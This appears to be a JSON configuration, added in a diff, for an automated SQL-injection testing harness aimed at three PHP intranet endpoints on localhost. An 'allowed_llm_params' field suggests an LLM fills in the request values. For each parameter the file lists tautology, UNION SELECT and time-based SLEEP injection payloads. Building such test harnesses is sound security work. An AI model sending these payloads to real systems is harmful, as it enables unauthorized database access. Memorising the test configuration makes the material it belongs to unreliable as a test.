@@ -1,0 +1,372 @@
+[
+  {
+    "api_sequence": {
+      "base_url": "http://localhost",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "trigger_vuln",
+          "method": "POST",
+          "url": "/intranet/agenda.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {
+            "versoes": "<versoes>",
+            "novo_repetir_dias": "<novo_repetir_dias>",
+            "novo_importante": "<novo_importante>",
+            "agenda_rap_horafim": "<agenda_rap_horafim>",
+            "time": "<time>",
+            "agenda_rap_id": "<agenda_rap_id>",
+            "versao": "<versao>",
+            "grava_hora_fim": "<grava_hora_fim>",
+            "deletar": "<deletar>",
+            "agenda_rap_conteudo": "<agenda_rap_conteudo>",
+            "agenda_rap_publico": "<agenda_rap_publico>",
+            "novo_publico": "<novo_publico>",
+            "restaura": "<restaura>",
+            "novo_hora_fim": "<novo_hora_fim>",
+            "novo_hora_inicio": "<novo_hora_inicio>",
+            "novo_data": "<novo_data>",
+            "grava_compromisso": "<grava_compromisso>",
+            "novo_descricao": "<novo_descricao>",
+            "agenda_rap_titulo": "<agenda_rap_titulo>",
+            "novo_repetir_qtd": "<novo_repetir_qtd>",
+            "cod_agenda": "<cod_agenda>",
+            "agenda_rap_hora": "<agenda_rap_hora>",
+            "agenda_rap_importante": "<agenda_rap_importante>",
+            "agenda_rap_data": "<agenda_rap_data>",
+            "novo_titulo": "<novo_titulo>"
+          },
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "versoes",
+        "novo_repetir_dias",
+        "novo_importante",
+        "agenda_rap_horafim",
+        "time",
+        "agenda_rap_id",
+        "versao",
+        "grava_hora_fim",
+        "deletar",
+        "agenda_rap_conteudo",
+        "agenda_rap_publico",
+        "novo_publico",
+        "restaura",
+        "novo_hora_fim",
+        "novo_hora_inicio",
+        "novo_data",
+        "grava_compromisso",
+        "novo_descricao",
+        "agenda_rap_titulo",
+        "novo_repetir_qtd",
+        "cod_agenda",
+        "agenda_rap_hora",
+        "agenda_rap_importante",
+        "agenda_rap_data",
+        "novo_titulo"
+      ],
+      "time_based_injection_threshold_seconds": 5.0
+    },
+    "param_candidates": {
+      "versoes": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "novo_repetir_dias": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "novo_importante": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "agenda_rap_horafim": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "time": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "agenda_rap_id": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "versao": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "grava_hora_fim": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "deletar": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "agenda_rap_conteudo": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "agenda_rap_publico": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "novo_publico": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "restaura": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "novo_hora_fim": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "novo_hora_inicio": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "novo_data": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "grava_compromisso": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "novo_descricao": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "agenda_rap_titulo": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "novo_repetir_qtd": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "cod_agenda": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "agenda_rap_hora": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "agenda_rap_importante": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "agenda_rap_data": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "novo_titulo": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ]
+    }
+  },
+  {
+    "api_sequence": {
+      "base_url": "http://localhost",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "trigger_vuln",
+          "method": "GET",
+          "url": "/intranet/agenda_admin_cad.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {
+            "edit_rem": "<edit_rem>",
+            "novo_editor": "<novo_editor>",
+            "cod_agenda": "<cod_agenda>",
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {},
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "edit_rem",
+        "novo_editor",
+        "cod_agenda"
+      ],
+      "time_based_injection_threshold_seconds": 5.0
+    },
+    "param_candidates": {
+      "edit_rem": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "novo_editor": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ],
+      "cod_agenda": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ]
+    }
+  },
+  {
+    "api_sequence": {
+      "base_url": "http://localhost",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "trigger_vuln",
+          "method": "GET",
+          "url": "/intranet/funcionario_vinculo_cad.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {
+            "cod_funcionario_vinculo": "<cod_funcionario_vinculo>",
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {},
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "cod_funcionario_vinculo"
+      ],
+      "time_based_injection_threshold_seconds": 5.0
+    },
+    "param_candidates": {
+      "cod_funcionario_vinculo": [
+        "1",
+        "test",
+        "1' OR '1'='1",
+        "1' UNION SELECT NULL--",
+        "1' AND SLEEP(3)--",
+        "1' OR SLEEP(3)--"
+      ]
+    }
+  }
+]
